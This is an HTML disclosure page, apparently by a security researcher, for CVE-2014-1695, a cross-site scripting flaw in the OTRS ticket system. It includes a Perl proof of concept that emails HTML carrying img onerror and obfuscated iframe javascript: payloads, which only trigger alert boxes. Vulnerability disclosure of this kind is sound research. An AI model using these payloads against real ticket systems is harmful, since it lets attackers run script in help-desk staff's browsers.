<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="content-type" content="text/html;charset=utf-8">
        <meta name="description" content="Cross-site scripting (XSS) vulnerability in Open Ticket Request System (OTRS)">
        <meta name="keywords" content="CVE-2014-1695">
        <meta name="author" content="Adam Ziaja">
        <title>Cross-site scripting (XSS) vulnerability in Open Ticket Request System (OTRS) (CVE-2014-1695)</title>
        <style type="text/css">
            body {
                margin-top: 25px;
                margin-left: 25px;
                background-color: #222930;
                font-family: 'Nunito', sans-serif;
                font-size: 13px;
            }
            p, pre {
                font-family: 'Nunito', sans-serif;
                font-size: 13px;
                color: #E9E9E9;
                text-align: justify;
                -webkit-text-shadow: 0 1.5px 0 black;
                -moz-text-shadow: 0 1.5px 0 black;
                text-shadow: 0 1.5px 0 black;
            }
            a, a:visited {
                color: #4EB1BA;
                text-decoration: none;
            }
            a:hover {
                color: #6A9A1F;
            }
            strong {
                color: #E9C92D;
                font-weight: normal;
            }
            .info, .success, .warning, .error {
                border: 1px solid;
                padding:15px 15px 15px 15px;
                background-repeat: no-repeat;
                background-position: 10px center;
            }
            .info {
                color: #00529B;
                background-color: #BDE5F8;
            }
            .success {
                color: #4F8A10;
                background-color: #DFF2BF;
            }
            .warning {
                color: #9F6000;
                background-color: #FEEFB3;
            }
            .error {
                color: #D8000C;
                background-color: #FFBABA;
            }
            hr {
                width: 150px;
                margin-left: 0;
                text-align: left;
            }
            pre {
                white-space: pre-wrap;       /* css-3 */
                white-space: -moz-pre-wrap;  /* Mozilla, since 1999 */
                white-space: -pre-wrap;      /* Opera 4-6 */
                white-space: -o-pre-wrap;    /* Opera 7 */
                word-wrap: break-word;       /* Internet Explorer 5.5+ */
            }
        </style>
        <link href="https://fonts.googleapis.com/css?family=Nunito" rel="stylesheet" type="text/css">
        <!-- SyntaxHighlighter: poczÄ…tek -->
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shCore.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPHP.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPython.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPerl.js"></script>
        <script type="text/javascript" src="/poc/syntaxhighlighter/scripts/shBrushPlain.js"></script>
        <link href="/poc/syntaxhighlighter/styles/shCore.css" rel="stylesheet" type="text/css" />
        <link href="/poc/syntaxhighlighter/styles/shThemeFadeToGrey.css" rel="stylesheet" type="text/css" />
        <script type="text/javascript">
            SyntaxHighlighter.all()
        </script>
        <!-- SyntaxHighlighter: koniec -->
    </head>
    <body>
        <p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-1695" target="_blank">CVE-2014-1695</a> &mdash; <strong>Cross-site scripting (XSS) vulnerability in Open Ticket Request System (OTRS) 3.1.x before 3.1.20, 3.2.x before 3.2.15, and 3.3.x before 3.3.5 allows remote attackers to inject arbitrary web script or HTML via a crafted HTML email.</strong></p>
        <p>Proof of Concept:</p>
        <pre class="brush: perl">#!/usr/bin/perl -w
# OTRS XSS PoC
# (C) 2014 Adam Ziaja &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f69792979bb69792979b8c9f979c97d895999b">[email&#160;protected]</a>&gt; http://adamziaja.com
use strict;
use MIME::Lite;
my $msg = MIME::Lite-&gt;new(
    Subject =&gt; 'OTRS XSS PoC',
    From =&gt; '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="49283d3d282a222c3b092c31282439252c672a2624">[email&#160;protected]</a>',
    To =&gt; '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="365942444576534e575b465a531855595b">[email&#160;protected]</a>',
    Type =&gt; 'text/html',
    Data =&gt;
        '&lt;html&gt;&lt;body&gt;&lt;img/onerror=&quot;alert(\'XSS1\')&quot;src=a&gt;&lt;iframe src=javasc&amp;#x72ipt:alert(\'XSS2\') &gt;&lt;/body&gt;&lt;/html&gt;'
);
$msg-&gt;send();
        </pre>
        <hr>
        <p>
            <strong>Adam Ziaja</strong> &lt;<a href="https://adamziaja.com">&#97;&#100;&#97;&#109;&#64;&#97;&#100;&#97;&#109;&#122;&#105;&#97;&#106;&#97;&#46;&#99;&#111;&#109;</a>&gt;
        </p>
    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body>
</html>
